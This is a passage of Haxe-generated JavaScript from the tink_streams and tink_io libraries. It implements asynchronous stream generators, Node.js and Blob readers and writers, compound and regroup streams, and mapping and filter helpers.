				switch(e._hx_index) {
				case 0:
					var v = e.value;
					var then = e.next;
					handler(v).handle(function(s) {
						switch(s._hx_index) {
						case 0:
							cb(tink_streams_Conclusion.Halted(_gthis));
							break;
						case 1:
							cb(tink_streams_Conclusion.Halted(then));
							break;
						case 2:
							then.forEach(handler).handle(cb);
							break;
						case 3:
							var e = s.e;
							cb(tink_streams_Conclusion.Clogged(e,_gthis));
							break;
						}
					});
					break;
				case 1:
					var e1 = e.e;
					cb(tink_streams_Conclusion.Failed(e1));
					break;
				case 2:
					cb(tink_streams_Conclusion.Depleted);
					break;
				}
			});
		});
	}
	,__class__: tink_streams_Generator
});
var tink_io_js_BlobSource = function(name,blob,pos,chunkSize) {
	this.name = name;
	tink_streams_Generator.call(this,tink_core_Future.async(function(cb) {
		if(pos >= blob.size) {
			cb(tink_streams_Step.End);
		} else {
			var end = pos + chunkSize;
			if(end > blob.size) {
				end = blob.size;
			}
			var reader = new FileReader();
			reader.onload = function() {
				var chunk = tink_chunk_ByteChunk.of(haxe_io_Bytes.ofData(reader.result));
				cb(tink_streams_Step.Link(chunk,new tink_io_js_BlobSource(name,blob,end,chunkSize)));
			};
			reader.onerror = function(e) {
				cb(tink_streams_Step.Fail(tink_core_TypedError.withData(500,e.message,e,{ fileName : "tink/io/js/BlobSource.hx", lineNumber : 29, className : "tink.io.js.BlobSource", methodName : "new"})));
			};
			reader.readAsArrayBuffer(blob.slice(pos,end));
		}
	},true));
};
tink_io_js_BlobSource.__name__ = true;
tink_io_js_BlobSource.wrap = function(name,blob,chunkSize) {
	return new tink_io_js_BlobSource(name,blob,0,chunkSize);
};
tink_io_js_BlobSource.__super__ = tink_streams_Generator;
tink_io_js_BlobSource.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_io_js_BlobSource
});
var tink_io_nodejs_NodejsSink = function(target) {
	this.target = target;
};
tink_io_nodejs_NodejsSink.__name__ = true;
tink_io_nodejs_NodejsSink.wrap = function(name,native) {
	return new tink_io_nodejs_NodejsSink(new tink_io_nodejs_WrappedWritable(name,native));
};
tink_io_nodejs_NodejsSink.__super__ = tink_io_SinkBase;
tink_io_nodejs_NodejsSink.prototype = $extend(tink_io_SinkBase.prototype,{
	consume: function(source,options) {
		var _gthis = this;
		var ret = source.forEach(tink_streams_Handler.ofUnknown(function(c) {
			return tink_core_Future.map(_gthis.target.write(c),function(w) {
				switch(w._hx_index) {
				case 0:
					if(w.data) {
						return tink_streams_Handled.Resume;
					} else {
						return tink_streams_Handled.BackOff;
					}
					break;
				case 1:
					var e = w.failure;
					return tink_streams_Handled.Clog(e);
				}
			});
		}));
		if(options != null && options.end) {
			ret.handle(function(end) {
				_gthis.target.end();
			});
		}
		return tink_core_Future.map(ret,function(c) {
			return tink_io_PipeResultTools.toResult(c,null);
		});
	}
	,__class__: tink_io_nodejs_NodejsSink
});
var tink_io_nodejs_NodejsSource = function(target) {
	tink_streams_Generator.call(this,tink_core_Future.async(function(cb) {
		target.read().handle(function(o) {
			var cb1 = cb;
			var tmp;
			switch(o._hx_index) {
			case 0:
				var _g = o.data;
				if(_g == null) {
					tmp = tink_streams_Step.End;
				} else {
					var chunk = _g;
					tmp = tink_streams_Step.Link(chunk,new tink_io_nodejs_NodejsSource(target));
				}
				break;
			case 1:
				var e = o.failure;
				tmp = tink_streams_Step.Fail(e);
				break;
			}
			cb1(tmp);
		});
	},true));
};
tink_io_nodejs_NodejsSource.__name__ = true;
tink_io_nodejs_NodejsSource.wrap = function(name,native,chunkSize,onEnd) {
	return new tink_io_nodejs_NodejsSource(new tink_io_nodejs_WrappedReadable(name,native,chunkSize,onEnd));
};
tink_io_nodejs_NodejsSource.__super__ = tink_streams_Generator;
tink_io_nodejs_NodejsSource.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_io_nodejs_NodejsSource
});
var tink_io_nodejs_WrappedReadable = function(name,native,chunkSize,onEnd) {
	this.name = name;
	this.native = native;
	this.chunkSize = chunkSize;
	var this1 = tink_core_Future.async(function(cb) {
		native.once("end",function() {
			cb(tink_core_Outcome.Success(null));
		});
		native.once("error",function(e) {
			cb(tink_core_Outcome.Failure(new tink_core_TypedError(null,"" + e.code + " - Failed reading from " + name + " because " + e.message,{ fileName : "tink/io/nodejs/WrappedReadable.hx", lineNumber : 22, className : "tink.io.nodejs.WrappedReadable", methodName : "new"})));
		});
	});
	this1.eager();
	this.end = this1;
	if(onEnd != null) {
		this.end.handle(function() {
			process.nextTick(onEnd);
		});
	}
};
tink_io_nodejs_WrappedReadable.__name__ = true;
tink_io_nodejs_WrappedReadable.prototype = {
	read: function() {
		var _gthis = this;
		return tink_core_Future.first(tink_core_Future.async(function(cb) {
			var attempt = null;
			attempt = function() {
				try {
					var _g = _gthis.native.read(_gthis.chunkSize);
					if(_g == null) {
						_gthis.native.once("readable",attempt);
					} else {
						var chunk = _g;
						var buf = typeof(chunk) == "string" ? new js_node_buffer_Buffer(chunk) : chunk;
						cb(tink_core_Outcome.Success(new tink_chunk_nodejs_BufferChunk(buf)));
					}
				} catch( _g ) {
					var e = haxe_Exception.caught(_g).unwrap();
					cb(tink_core_Outcome.Failure(tink_core_TypedError.withData(null,"Error while reading from " + _gthis.name,e,{ fileName : "tink/io/nodejs/WrappedReadable.hx", lineNumber : 48, className : "tink.io.nodejs.WrappedReadable", methodName : "read"})));
				}
			};
			attempt();
		}),this.end);
	}
	,__class__: tink_io_nodejs_WrappedReadable
};
var tink_io_nodejs_WrappedWritable = function(name,native) {
	this.name = name;
	this.native = native;
	this.ended = tink_core_Future.async(function(cb) {
		native.once("end",function() {
			cb(tink_core_Outcome.Success(false));
		});
		native.once("finish",function() {
			cb(tink_core_Outcome.Success(false));
		});
		native.once("close",function() {
			cb(tink_core_Outcome.Success(false));
		});
		native.on("error",function(e) {
			cb(tink_core_Outcome.Failure(new tink_core_TypedError(null,"" + e.code + ": " + e.message,{ fileName : "tink/io/nodejs/WrappedWritable.hx", lineNumber : 24, className : "tink.io.nodejs.WrappedWritable", methodName : "new"})));
		});
	});
};
tink_io_nodejs_WrappedWritable.__name__ = true;
tink_io_nodejs_WrappedWritable.prototype = {
	end: function() {
		var didEnd = false;
		var this1 = this.ended.handle(function() {
			didEnd = true;
		});
		if(this1 != null) {
			this1.cancel();
		}
		if(didEnd) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(false)));
		}
		this.native.end();
		return tink_core_Promise.next(this.ended,function(_) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(true)));
		});
	}
	,write: function(chunk) {
		var _gthis = this;
		return tink_core_Future.first(tink_core_Future.async(function(cb) {
			if(chunk.getLength() == 0) {
				cb(tink_core_Outcome.Success(true));
				return;
			}
			var buf;
			if(js_node_buffer_Buffer.isBuffer(chunk.buffer)) {
				buf = chunk.buffer;
			} else {
				var b = chunk.toBytes();
				var data = b.b;
				buf = js_node_buffer_Buffer.from(data.buffer,data.byteOffset,b.length);
			}
			var _g = cb;
			var a1 = tink_core_Outcome.Success(true);
			var tmp = function() {
				_g(a1);
			};
			_gthis.native.write(buf,null,tmp);
		}),this.ended);
	}
	,__class__: tink_io_nodejs_WrappedWritable
};
var tink_io_std_InputSource = function(name,target,worker,buf,offset) {
	var next = function(buf,offset) {
		return new tink_io_std_InputSource(name,target,worker,buf,offset);
	};
	var free = buf.length - offset;
	tink_streams_Generator.call(this,tink_core_Future.async(function(cb) {
		tink_io_Worker.work(worker,new tink_core__$Lazy_LazyFunc(function() {
			try {
				var read = target.readBytes(buf,offset,free);
				if(read == 0) {
					return tink_streams_Step.Link(tink_Chunk.EMPTY,next(buf,offset));
				} else {
					var nextOffset = free - read < 1024 ? 0 : offset + read;
					var nextBuf = nextOffset == 0 ? new haxe_io_Bytes(new ArrayBuffer(buf.length)) : buf;
					return tink_streams_Step.Link(tink_chunk_ByteChunk.of(buf).slice(offset,offset + read),next(nextBuf,nextOffset));
				}
			} catch( _g ) {
				var _g1 = haxe_Exception.caught(_g).unwrap();
				if(((_g1) instanceof haxe_io_Eof)) {
					return tink_streams_Step.End;
				} else if(js_Boot.__instanceof(_g1,haxe_io_Error)) {
					var e = _g1;
					if(e._hx_index == 0) {
						return tink_streams_Step.Link(tink_Chunk.EMPTY,next(buf,offset));
					} else {
						return tink_streams_Step.Fail(tink_core_TypedError.withData(null,"Failed to read from " + name,e,{ fileName : "tink/io/std/InputSource.hx", lineNumber : 50, className : "tink.io.std.InputSource", methodName : "new"}));
					}
				} else {
					throw _g;
				}
			}
		})).handle(function(step) {
			switch(step._hx_index) {
			case 1:
				var _g = step.e;
				try {
					target.close();
				} catch( _g ) {
				}
				break;
			case 2:
				try {
					target.close();
				} catch( _g ) {
				}
				break;
			default:
			}
			cb(step);
		});
	},true));
};
tink_io_std_InputSource.__name__ = true;
tink_io_std_InputSource.__super__ = tink_streams_Generator;
tink_io_std_InputSource.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_io_std_InputSource
});
var tink_io_std_OutputSink = function(name,target,worker) {
	this.name = name;
	this.target = target;
	this.worker = worker;
};
tink_io_std_OutputSink.__name__ = true;
tink_io_std_OutputSink.__super__ = tink_io_SinkBase;
tink_io_std_OutputSink.prototype = $extend(tink_io_SinkBase.prototype,{
	consume: function(source,options) {
		var _gthis = this;
		var rest = tink_Chunk.EMPTY;
		var ret = source.forEach(tink_streams_Handler.ofUnknown(function(c) {
			return tink_core_Future.async(function(cb) {
				var pos = 0;
				var bytes = c.toBytes();
				var write = null;
				write = function() {
					if(pos == bytes.length) {
						cb(tink_streams_Handled.Resume);
					} else {
						tink_io_Worker.work(_gthis.worker,new tink_core__$Lazy_LazyFunc(function() {
							try {
								return tink_core_Outcome.Success(_gthis.target.writeBytes(bytes,pos,bytes.length - pos));
							} catch( _g ) {
								var _g1 = haxe_Exception.caught(_g).unwrap();
								if(((_g1) instanceof haxe_io_Eof)) {
									return tink_core_Outcome.Success(-1);
								} else if(js_Boot.__instanceof(_g1,haxe_io_Error)) {
									var e = _g1;
									if(e._hx_index == 0) {
										return tink_core_Outcome.Success(0);
									} else {
										return tink_core_Outcome.Failure(tink_core_TypedError.withData(null,"Error writing to " + _gthis.name,e,{ fileName : "tink/io/std/OutputSink.hx", lineNumber : 40, className : "tink.io.std.OutputSink", methodName : "consume"}));
									}
								} else if(((_g1) instanceof tink_core_TypedError)) {
									var e = _g1;
									return tink_core_Outcome.Failure(e);
								} else {
									var e = _g1;
									return tink_core_Outcome.Failure(tink_core_TypedError.withData(null,"Error writing to " + _gthis.name,e,{ fileName : "tink/io/std/OutputSink.hx", lineNumber : 46, className : "tink.io.std.OutputSink", methodName : "consume"}));
								}
							}
						})).handle(function(o) {
							switch(o._hx_index) {
							case 0:
								var _g = o.data;
								if(_g == -1) {
									rest = tink_chunk_ByteChunk.of(bytes).slice(pos,bytes.length);
									cb(tink_streams_Handled.Finish);
								} else {
									var v = _g;
									pos += v;
									if(pos == bytes.length) {
										cb(tink_streams_Handled.Resume);
									} else {
										write();
									}
								}
								break;
							case 1:
								var e = o.failure;
								cb(tink_streams_Handled.Clog(e));
								break;
							}
						});
					}
				};
				write();
			});
		}));
		if(options != null && options.end) {
			ret.handle(function(end) {
				try {
					_gthis.target.close();
				} catch( _g ) {
				}
			});
		}
		return tink_core_Future.map(ret,function(c) {
			return tink_io_PipeResultTools.toResult(c,null,rest);
		});
	}
	,__class__: tink_io_std_OutputSink
});
var tink_streams_IdealStream = {};
tink_streams_IdealStream.promiseOfIdealStream = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_IdealStream.promiseOfStreamNoise = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_IdealStream.collect = function(this1) {
	var buf = [];
	return tink_core_Future.map(this1.forEach(tink_streams_Handler.ofSafe(function(x) {
		buf.push(x);
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Resume));
	})),function(c) {
		return buf;
	});
};
var tink_streams_IdealStreamBase = function() {
	tink_streams_StreamBase.call(this);
};
tink_streams_IdealStreamBase.__name__ = true;
tink_streams_IdealStreamBase.__super__ = tink_streams_StreamBase;
tink_streams_IdealStreamBase.prototype = $extend(tink_streams_StreamBase.prototype,{
	idealize: function(rescue) {
		return this;
	}
	,__class__: tink_streams_IdealStreamBase
});
var tink_streams_RealStream = {};
tink_streams_RealStream.promiseOfIdealStream = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_RealStream.promiseOfStreamNoise = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_RealStream.promiseOfRealStream = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_RealStream.promiseOfStreamError = function(p) {
	return tink_streams_Stream.promise(p);
};
tink_streams_RealStream.collect = function(this1) {
	var buf = [];
	return tink_core_Future.map(this1.forEach(tink_streams_Handler.ofSafe(function(x) {
		buf.push(x);
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Resume));
	})),function(c) {
		switch(c._hx_index) {
		case 0:
			var _g = c.rest;
			throw haxe_Exception.thrown("unreachable");
		case 2:
			var e = c.error;
			return tink_core_Outcome.Failure(e);
		case 3:
			return tink_core_Outcome.Success(buf);
		}
	});
};
var tink_streams_Stream = {};
tink_streams_Stream.get_depleted = function(this1) {
	return this1.get_depleted();
};
tink_streams_Stream.dirty = function(this1) {
	return this1;
};
tink_streams_Stream.single = function(i) {
	return new tink_streams_Single(new tink_core__$Lazy_LazyConst(i));
};
tink_streams_Stream.ofIterator = function(i) {
	var next = null;
	next = function(step) {
		step(i.hasNext() ? tink_streams_Step.Link(i.next(),tink_streams_Generator.stream(next)) : tink_streams_Step.End);
	};
	return tink_streams_Generator.stream(next);
};
tink_streams_Stream.flatten = function(stream) {
	return stream.regroup(tink_streams_Regrouper.ofIgnoranceSync(function(arr) {
		return tink_streams_RegroupResult.Converted(arr[0]);
	}));
};
tink_streams_Stream.future = function(f) {
	return new tink_streams_FutureStream(f);
};
tink_streams_Stream.promiseIdeal = function(f) {
	return tink_streams_Stream.promise(f);
};
tink_streams_Stream.promiseReal = function(f) {
	return tink_streams_Stream.promise(f);
};
tink_streams_Stream.promise = function(f) {
	return tink_streams_Stream.future(tink_core_Future.map(f,function(o) {
		switch(o._hx_index) {
		case 0:
			var s = o.data;
			return tink_streams_Stream.dirty(s);
		case 1:
			var e = o.failure;
			return tink_streams_Stream.ofError(e);
		}
	}));
};
tink_streams_Stream.ofError = function(e) {
	return new tink_streams__$Stream_ErrorStream(e);
};
tink_streams_Stream.ofNodeStream = function(name,r,options) {
	return tink_streams_nodejs_NodejsStream.wrap(name,r,options == null ? null : options.onEnd);
};
var tink_streams_RegroupStatus = $hxEnums["tink.streams.RegroupStatus"] = { __ename__:true,__constructs__:null
	,Flowing: {_hx_name:"Flowing",_hx_index:0,__enum__:"tink.streams.RegroupStatus",toString:$estr}
	,Errored: ($_=function(e) { return {_hx_index:1,e:e,__enum__:"tink.streams.RegroupStatus",toString:$estr}; },$_._hx_name="Errored",$_.__params__ = ["e"],$_)
	,Ended: {_hx_name:"Ended",_hx_index:2,__enum__:"tink.streams.RegroupStatus",toString:$estr}
};
tink_streams_RegroupStatus.__constructs__ = [tink_streams_RegroupStatus.Flowing,tink_streams_RegroupStatus.Errored,tink_streams_RegroupStatus.Ended];
var tink_streams_RegroupResult = $hxEnums["tink.streams.RegroupResult"] = { __ename__:true,__constructs__:null
	,Converted: ($_=function(data,untouched) { return {_hx_index:0,data:data,untouched:untouched,__enum__:"tink.streams.RegroupResult",toString:$estr}; },$_._hx_name="Converted",$_.__params__ = ["data","untouched"],$_)
	,Terminated: ($_=function(data) { return {_hx_index:1,data:data,__enum__:"tink.streams.RegroupResult",toString:$estr}; },$_._hx_name="Terminated",$_.__params__ = ["data"],$_)
	,Untouched: {_hx_name:"Untouched",_hx_index:2,__enum__:"tink.streams.RegroupResult",toString:$estr}
	,Errored: ($_=function(e) { return {_hx_index:3,e:e,__enum__:"tink.streams.RegroupResult",toString:$estr}; },$_._hx_name="Errored",$_.__params__ = ["e"],$_)
};
tink_streams_RegroupResult.__constructs__ = [tink_streams_RegroupResult.Converted,tink_streams_RegroupResult.Terminated,tink_streams_RegroupResult.Untouched,tink_streams_RegroupResult.Errored];
var tink_streams_Regrouper = {};
tink_streams_Regrouper.ofIgnorance = function(f) {
	return { apply : function(i,_) {
		return f(i);
	}};
};
tink_streams_Regrouper.ofIgnoranceSync = function(f) {
	return { apply : function(i,_) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(i)));
	}};
};
tink_streams_Regrouper.ofFunc = function(f) {
	return { apply : f};
};
tink_streams_Regrouper.ofFuncSync = function(f) {
	return { apply : function(i,s) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(i,s)));
	}};
};
var tink_streams__$Stream_CompoundStream = function(parts) {
	tink_streams_StreamBase.call(this);
	this.parts = parts;
};
tink_streams__$Stream_CompoundStream.__name__ = true;
tink_streams__$Stream_CompoundStream.consumeParts = function(parts,handler,cb) {
	if(parts.length == 0) {
		cb(tink_streams_Conclusion.Depleted);
	} else {
		parts[0].forEach(handler).handle(function(o) {
			switch(o._hx_index) {
			case 0:
				var rest = o.rest;
				parts = parts.slice();
				parts[0] = rest;
				cb(tink_streams_Conclusion.Halted(new tink_streams__$Stream_CompoundStream(parts)));
				break;
			case 1:
				var e = o.error;
				var at = o.at;
				if(at.get_depleted()) {
					parts = parts.slice(1);
				} else {
					parts = parts.slice();
					parts[0] = at;
				}
				cb(tink_streams_Conclusion.Clogged(e,new tink_streams__$Stream_CompoundStream(parts)));
				break;
			case 2:
				var e = o.error;
				cb(tink_streams_Conclusion.Failed(e));
				break;
			case 3:
				tink_streams__$Stream_CompoundStream.consumeParts(parts.slice(1),handler,cb);
				break;
			}
		});
	}
};
tink_streams__$Stream_CompoundStream.of = function(streams) {
	var ret = [];
	var _g = 0;
	while(_g < streams.length) {
		var s = streams[_g];
		++_g;
		s.decompose(ret);
	}
	if(ret.length == 0) {
		return tink_streams_Empty.inst;
	} else {
		return new tink_streams__$Stream_CompoundStream(ret);
	}
};
tink_streams__$Stream_CompoundStream.__super__ = tink_streams_StreamBase;
tink_streams__$Stream_CompoundStream.prototype = $extend(tink_streams_StreamBase.prototype,{
	get_depleted: function() {
		switch(this.parts.length) {
		case 0:
			return true;
		case 1:
			return this.parts[0].get_depleted();
		default:
			return false;
		}
	}
	,next: function() {
		var _gthis = this;
		if(this.parts.length == 0) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.End));
		} else {
			return tink_core_Future.flatMap(this.parts[0].next(),function(v) {
				switch(v._hx_index) {
				case 0:
					var v1 = v.value;
					var rest = v.next;
					var copy = _gthis.parts.slice();
					copy[0] = rest;
					return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.Link(v1,new tink_streams__$Stream_CompoundStream(copy))));
				case 2:
					if(_gthis.parts.length > 1) {
						return _gthis.parts[1].next();
					} else {
						return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
					}
					break;
				default:
					return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
				}
			});
		}
	}
	,decompose: function(into) {
		var _g = 0;
		var _g1 = this.parts;
		while(_g < _g1.length) {
			var p = _g1[_g];
			++_g;
			p.decompose(into);
		}
	}
	,forEach: function(handler) {
		var parts = this.parts;
		var handler1 = handler;
		return tink_core_Future.async(function(cb) {
			tink_streams__$Stream_CompoundStream.consumeParts(parts,handler1,cb);
		});
	}
	,__class__: tink_streams__$Stream_CompoundStream
});
var tink_streams__$Stream_RegroupStream = function(source,f,prev,buf) {
	if(prev == null) {
		prev = tink_streams_Empty.inst;
	}
	if(buf == null) {
		buf = [];
	}
	var ret = null;
	var terminated = false;
	var next = tink_streams_Stream.future(tink_core_Future.map(source.forEach(tink_streams_Handler.ofUnknown(function(item) {
		buf.push(item);
		return tink_core_Future.map(f.apply(buf,tink_streams_RegroupStatus.Flowing),function(o) {
			switch(o._hx_index) {
			case 0:
				var v = o.data;
				var untouched = o.untouched;
				ret = v;
				buf = untouched;
				return tink_streams_Handled.Finish;
			case 1:
				var v = o.data;
				var l = new tink_core__$Lazy_LazyFunc(tink_streams_Empty.make);
				if(v._hx_index == 0) {
					var v1 = v.v;
					ret = v1;
				} else {
					ret = tink_core_Lazy.get(l);
				}
				terminated = true;
				return tink_streams_Handled.Finish;
			case 2:
				return tink_streams_Handled.Resume;
			case 3:
				var e = o.e;
				return tink_streams_Handled.Clog(e);
			}
		});
	})),function(o) {
		switch(o._hx_index) {
		case 0:
			if(terminated) {
				return ret;
			} else {
				var rest = o.rest;
				return new tink_streams__$Stream_RegroupStream(rest,f,ret,buf);
			}
			break;
		case 1:
			var _g = o.at;
			var e = o.error;
			return new tink_streams__$Stream_ErrorStream(e);
		case 2:
			var e = o.error;
			return tink_streams_Stream.ofError(e);
		case 3:
			if(buf.length == 0) {
				return tink_streams_Empty.inst;
			} else {
				return tink_streams_Stream.future(tink_core_Future.map(f.apply(buf,tink_streams_RegroupStatus.Ended),function(o) {
					switch(o._hx_index) {
					case 0:
						var _g = o.untouched;
						var v = o.data;
						return v;
					case 1:
						var v = o.data;
						var l = new tink_core__$Lazy_LazyFunc(tink_streams_Empty.make);
						if(v._hx_index == 0) {
							var v1 = v.v;
							return v1;
						} else {
							return tink_core_Lazy.get(l);
						}
						break;
					case 2:
						return tink_streams_Empty.inst;
					case 3:
						var e = o.e;
						return tink_streams_Stream.ofError(e);
					}
				}));
			}
			break;
		}
	}));
	tink_streams__$Stream_CompoundStream.call(this,[prev,next]);
};
tink_streams__$Stream_RegroupStream.__name__ = true;
tink_streams__$Stream_RegroupStream.__super__ = tink_streams__$Stream_CompoundStream;
tink_streams__$Stream_RegroupStream.prototype = $extend(tink_streams__$Stream_CompoundStream.prototype,{
	__class__: tink_streams__$Stream_RegroupStream
});
var tink_streams_Handled = $hxEnums["tink.streams.Handled"] = { __ename__:true,__constructs__:null
	,BackOff: {_hx_name:"BackOff",_hx_index:0,__enum__:"tink.streams.Handled",toString:$estr}
	,Finish: {_hx_name:"Finish",_hx_index:1,__enum__:"tink.streams.Handled",toString:$estr}
	,Resume: {_hx_name:"Resume",_hx_index:2,__enum__:"tink.streams.Handled",toString:$estr}
	,Clog: ($_=function(e) { return {_hx_index:3,e:e,__enum__:"tink.streams.Handled",toString:$estr}; },$_._hx_name="Clog",$_.__params__ = ["e"],$_)
};
tink_streams_Handled.__constructs__ = [tink_streams_Handled.BackOff,tink_streams_Handled.Finish,tink_streams_Handled.Resume,tink_streams_Handled.Clog];
var tink_streams_Conclusion = $hxEnums["tink.streams.Conclusion"] = { __ename__:true,__constructs__:null
	,Halted: ($_=function(rest) { return {_hx_index:0,rest:rest,__enum__:"tink.streams.Conclusion",toString:$estr}; },$_._hx_name="Halted",$_.__params__ = ["rest"],$_)
	,Clogged: ($_=function(error,at) { return {_hx_index:1,error:error,at:at,__enum__:"tink.streams.Conclusion",toString:$estr}; },$_._hx_name="Clogged",$_.__params__ = ["error","at"],$_)
	,Failed: ($_=function(error) { return {_hx_index:2,error:error,__enum__:"tink.streams.Conclusion",toString:$estr}; },$_._hx_name="Failed",$_.__params__ = ["error"],$_)
	,Depleted: {_hx_name:"Depleted",_hx_index:3,__enum__:"tink.streams.Conclusion",toString:$estr}
};
tink_streams_Conclusion.__constructs__ = [tink_streams_Conclusion.Halted,tink_streams_Conclusion.Clogged,tink_streams_Conclusion.Failed,tink_streams_Conclusion.Depleted];
var tink_streams_ReductionStep = $hxEnums["tink.streams.ReductionStep"] = { __ename__:true,__constructs__:null
	,Progress: ($_=function(result) { return {_hx_index:0,result:result,__enum__:"tink.streams.ReductionStep",toString:$estr}; },$_._hx_name="Progress",$_.__params__ = ["result"],$_)
	,Crash: ($_=function(e) { return {_hx_index:1,e:e,__enum__:"tink.streams.ReductionStep",toString:$estr}; },$_._hx_name="Crash",$_.__params__ = ["e"],$_)
};
tink_streams_ReductionStep.__constructs__ = [tink_streams_ReductionStep.Progress,tink_streams_ReductionStep.Crash];
var tink_streams_Reduction = $hxEnums["tink.streams.Reduction"] = { __ename__:true,__constructs__:null
	,Crashed: ($_=function(error,at) { return {_hx_index:0,error:error,at:at,__enum__:"tink.streams.Reduction",toString:$estr}; },$_._hx_name="Crashed",$_.__params__ = ["error","at"],$_)
	,Failed: ($_=function(error) { return {_hx_index:1,error:error,__enum__:"tink.streams.Reduction",toString:$estr}; },$_._hx_name="Failed",$_.__params__ = ["error"],$_)
	,Reduced: ($_=function(result) { return {_hx_index:2,result:result,__enum__:"tink.streams.Reduction",toString:$estr}; },$_._hx_name="Reduced",$_.__params__ = ["result"],$_)
};
tink_streams_Reduction.__constructs__ = [tink_streams_Reduction.Crashed,tink_streams_Reduction.Failed,tink_streams_Reduction.Reduced];
var tink_streams__$Stream_CloggedStream = function(rest,error) {
	tink_streams_StreamBase.call(this);
	this.rest = rest;
	this.error = error;
};
tink_streams__$Stream_CloggedStream.__name__ = true;
tink_streams__$Stream_CloggedStream.__super__ = tink_streams_StreamBase;
tink_streams__$Stream_CloggedStream.prototype = $extend(tink_streams_StreamBase.prototype,{
	next: function() {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.Fail(this.error)));
	}
	,forEach: function(handler) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Conclusion.Clogged(this.error,this.rest)));
	}
	,__class__: tink_streams__$Stream_CloggedStream
});
var tink_streams__$Stream_ErrorStream = function(error) {
	tink_streams_StreamBase.call(this);
	this.error = error;
};
tink_streams__$Stream_ErrorStream.__name__ = true;
tink_streams__$Stream_ErrorStream.__super__ = tink_streams_StreamBase;
tink_streams__$Stream_ErrorStream.prototype = $extend(tink_streams_StreamBase.prototype,{
	next: function() {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.Fail(this.error)));
	}
	,forEach: function(handler) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Conclusion.Failed(this.error)));
	}
	,__class__: tink_streams__$Stream_ErrorStream
});
var tink_streams_Mapping = {};
tink_streams_Mapping._new = function(o) {
	var this1 = o;
	return this1;
};
tink_streams_Mapping.ofNext = function(n) {
	var this1 = { apply : function(i,_) {
		var this1 = tink_core_Promise.next(n(i[0]),function(o) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(tink_streams_RegroupResult.Converted(tink_streams_Stream.single(o)))));
		});
		var f = tink_core_Recover.ofSync(tink_streams_RegroupResult.Errored);
		return tink_core_Future.flatMap(this1,function(o) {
			switch(o._hx_index) {
			case 0:
				var d = o.data;
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(d));
			case 1:
				var e = o.failure;
				return f(e);
			}
		});
	}};
	return this1;
};
tink_streams_Mapping.ofAsync = function(f) {
	var this1 = { apply : function(i,_) {
		return tink_core_Future.map(f(i[0]),function(o) {
			return tink_streams_RegroupResult.Converted(tink_streams_Stream.single(o));
		});
	}};
	return this1;
};
tink_streams_Mapping.ofSync = function(f) {
	var this1 = { apply : function(i,_) {
		var v;
		var _g = f(i[0]);
		switch(_g._hx_index) {
		case 0:
			var v1 = _g.data;
			v = tink_streams_RegroupResult.Converted(tink_streams_Stream.single(v1));
			break;
		case 1:
			var e = _g.failure;
			v = tink_streams_RegroupResult.Errored(e);
			break;
		}
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
	}};
	return this1;
};
tink_streams_Mapping.ofPlain = function(f) {
	var this1 = { apply : function(i,_) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_RegroupResult.Converted(tink_streams_Stream.single(f(i[0])))));
	}};
	return this1;
};
var tink_streams_Filter = {};
tink_streams_Filter._new = function(o) {
	var this1 = o;
	return this1;
};
tink_streams_Filter.ofNext = function(n) {
	var this1 = { apply : function(i,_) {
		var this1 = tink_core_Promise.next(n(i[0]),function(matched) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(tink_streams_RegroupResult.Converted(matched ? tink_streams_Stream.single(i[0]) : tink_streams_Empty.inst))));
		});
		var f = tink_core_Recover.ofSync(tink_streams_RegroupResult.Errored);
		return tink_core_Future.flatMap(this1,function(o) {
			switch(o._hx_index) {
			case 0:
				var d = o.data;
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(d));
			case 1:
				var e = o.failure;
				return f(e);
			}
		});
	}};
	return this1;
};
tink_streams_Filter.ofAsync = function(f) {
	var this1 = { apply : function(i,_) {
		return tink_core_Future.map(f(i[0]),function(matched) {
			return tink_streams_RegroupResult.Converted(matched ? tink_streams_Stream.single(i[0]) : tink_streams_Empty.inst);
		});
	}};
	return this1;
};
tink_streams_Filter.ofSync = function(f) {
	var this1 = { apply : function(i,_) {
		var v;
		var _g = f(i[0]);
		switch(_g._hx_index) {
		case 0:
			var v1 = _g.data;
			v = tink_streams_RegroupResult.Converted(v1 ? tink_streams_Stream.single(i[0]) : tink_streams_Empty.inst);
			break;
		case 1:
			var e = _g.failure;
			v = tink_streams_RegroupResult.Errored(e);
			break;
		}
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
	}};
	return this1;
};
tink_streams_Filter.ofPlain = function(f) {
	var this1 = { apply : function(i,_) {
